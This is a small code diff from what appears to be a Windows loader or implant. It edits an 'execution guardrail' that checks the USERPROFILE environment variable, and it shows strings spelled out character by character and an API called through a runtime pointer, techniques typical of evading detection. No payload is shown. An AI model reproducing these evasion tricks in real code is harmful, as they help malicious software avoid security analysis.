@@ -43,7 +43,7 @@ int main()
 
 	// Execution Guardrail: Env Check
 	wchar_t envVarName[] = {'U','S','E','R','P','R','O','F','I','L','E', 0};
-	wchar_t tocheck[] = {'C',':','\\','U','s','e','r','s','\\','h','a','c','k','e','r', 0}; // L"C:\\Users\\hacker"
+	wchar_t tocheck[] = {'C',':','\\','U','s','e','r','s','\\', 0};
 	WCHAR buffer[1024];  // NOTE: Do not make it bigger, or we have a __chkstack() dependency!
 	DWORD result = ((DWORD(WINAPI*)(LPCWSTR, LPWSTR, DWORD))_GetEnvironmentVariableW)(envVarName, buffer, 1024);
 	if (result == 0) {
